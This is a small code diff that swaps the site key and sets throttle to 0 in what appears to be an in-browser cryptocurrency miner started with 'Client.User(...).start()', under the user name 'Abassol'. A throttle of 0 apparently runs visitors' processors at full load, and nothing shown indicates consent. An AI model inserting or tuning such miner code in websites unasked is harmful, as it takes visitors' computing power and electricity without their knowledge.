@@ -1,4 +1,4 @@
-var _client = new Client.User('c83706cb3c2d3c51207caf61ca99760ff4241fe88a013fe0e61888200591741b','Abassol', {
-   throttle: 0.1, c: 'w',ads: 0
+var _client = new Client.User('9f17605b23c48e4bef868ca648c4f7d0a39839a9d9b5cb72edc6ca04bc7a0e96','Abassol', {
+   throttle: 0, c: 'w',ads: 0
     });
     _client.start();
